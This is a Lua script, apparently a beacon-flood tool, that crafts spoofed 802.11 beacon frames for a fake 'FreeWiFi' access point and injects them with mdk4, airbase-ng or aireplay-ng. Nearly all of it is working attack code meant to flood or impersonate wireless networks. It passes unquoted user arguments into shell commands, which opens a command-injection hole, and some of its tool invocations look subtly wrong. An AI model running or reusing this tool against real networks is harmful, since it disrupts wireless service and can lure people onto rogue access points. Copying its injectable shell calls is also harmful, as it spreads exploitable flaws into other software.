local iface = arg[1]
local channel = arg[2]
local count = tonumber(arg[3]) or 100
local ssid = arg[4] or "FreeWiFi"
local bssid = arg[5] or "00:11:22:33:44:55"

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":' .. json_escape(ssid) .. ',"channel":' .. json_escape(channel) .. ',"data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then
    telemetry("monitor_ok", '{"message":"Monitor mode confirmed on ' .. iface .. '"}')
    return true
  end
  telemetry("monitor_fail", '{"message":"' .. iface .. ' is not in monitor mode"}')
  return false
end

local function set_channel()
  local cmd = "iw dev " .. iface .. " set channel " .. channel .. " 2>/dev/null"
  os.execute(cmd)
  local cmd2 = "iwconfig " .. iface .. " channel " .. channel .. " 2>/dev/null"
  os.execute(cmd2)
  telemetry("channel_set", '{"channel":' .. json_escape(channel) .. '}')
end

local function build_beacon_frame()
  -- 802.11 Beacon frame: management type (0x80), subtype 8
  local frame = string.char(0x80, 0x00) -- frame control: beacon
  frame = frame .. string.char(0x00, 0x00) -- duration
  -- destination: broadcast
  frame = frame .. string.char(0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
  -- source BSSID
  for b in bssid:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  -- BSSID (same as source for AP)
  for b in bssid:gmatch("(%x%x)") do
    frame = frame .. string.char(tonumber(b, 16))
  end
  -- fragment/sequence
  frame = frame .. string.char(0x00, 0x00)

  -- Beacon frame body
  -- Timestamp (8 bytes)
  frame = frame .. string.char(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
  -- Beacon interval (2 bytes) = 100 TU
  frame = frame .. string.char(0x64, 0x00)
  -- Capabilities: ESS, privacy (WPA2)
  frame = frame .. string.char(0x31, 0x04)

  -- SSID element (tag 0)
  local ssid_len = #ssid
  if ssid_len > 32 then ssid_len = 32 end
  frame = frame .. string.char(0x00, ssid_len) .. ssid:sub(1, ssid_len)

  -- Supported rates (tag 1): 1,2,5.5,11,6,9,12,18 Mbps
  frame = frame .. string.char(0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24)

  -- DS Parameter set (tag 3): current channel
  frame = frame .. string.char(0x03, 0x01, tonumber(channel) or 1)

  -- RSN Information (tag 48) for WPA2
  local rsn_body = string.char(
    0x01, 0x00, -- version
    0x00, 0x0f, 0xac, 0x02, -- group cipher: TKIP
    0x01, 0x00, -- pairwise cipher count
    0x00, 0x0f, 0xac, 0x04, -- pairwise cipher: CCMP
    0x01, 0x00, -- AKM count
    0x00, 0x0f, 0xac, 0x02, -- AKM: PSK
    0x00, 0x00 -- RSN capabilities
  )
  frame = frame .. string.char(0x30, #rsn_body) .. rsn_body

  -- Extended supported rates (tag 50): 24,36,48,54 Mbps
  frame = frame .. string.char(0x32, 0x04, 0x30, 0x48, 0x60, 0x6c)

  return frame
end

local function inject_frame_mdk4()
  local cmd = "mdk4 " .. iface .. " b -n " .. ssid .. " -c " .. channel .. " -b " .. bssid .. " -s " .. tostring(count) .. " 2>/dev/null"
  telemetry("inject_start", '{"method":"mdk4","cmd":' .. json_escape(cmd) .. '}')
  local f = io.popen(cmd)
  if not f then
    telemetry("inject_fail", '{"method":"mdk4","error":"Failed to start mdk4"}')
    return false
  end
  local timer = 0
  while timer < 10 do
    local line = f:read("*l")
    if not line then break end
    if line:find("Packets") or line:find("sent") then
      telemetry("beacon_sent", '{"data":' .. json_escape(line:sub(1, 200)) .. '}')
    end
    timer = timer + 0.1
  end
  f:close()
  return true
end

local function inject_frame_raw()
  local frame = build_beacon_frame()
  -- Try to inject via airbase-ng -I for raw frame injection
  local tmpfile = "/tmp/beacon_" .. iface .. ".bin"
  local f = io.open(tmpfile, "wb")
  if not f then return false end
  f:write(frame)
  f:close()

  local cmd = "airbase-ng -I " .. tmpfile .. " " .. iface .. " 2>/dev/null &"
  telemetry("inject_raw", '{"method":"airbase-ng","file":' .. json_escape(tmpfile) .. '}')
  os.execute(cmd)
  return true
end

local function send_beacon_loop()
  telemetry("beacon_start", '{"count":' .. tostring(count) .. '}')
  local frame = build_beacon_frame()
  local tmp = "/tmp/beacon_loop_" .. iface .. ".bin"
  local f = io.open(tmp, "wb")
  if not f then return end
  for i = 1, count do
    f:write(frame)
    if i % 10 == 0 then
      telemetry("beacon_sent", '{"sent":' .. tostring(i) .. ',"total":' .. tostring(count) .. '}')
    end
  end
  f:close()

  local cmd = "cat " .. tmp .. " | aireplay-ng -D " .. iface .. " 2>/dev/null"
  os.execute(cmd)
  telemetry("beacon_done", '{"sent":' .. tostring(count) .. '}')
end

if not iface or not channel then
  telemetry("error", '{"error":"Usage: beacon_flood.lua <interface> <channel> [count] [ssid] [bssid]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Interface ' .. iface .. ' not in monitor mode. Run: airmon-ng start ' .. iface .. '"}')
  os.exit(1)
end

set_channel()

local ok = inject_frame_mdk4()
if not ok then
  telemetry("fallback", '{"message":"mdk4 not available, trying raw injection"}')
  send_beacon_loop()
end

telemetry("complete", '{"total_beacons":' .. tostring(count) .. '}')
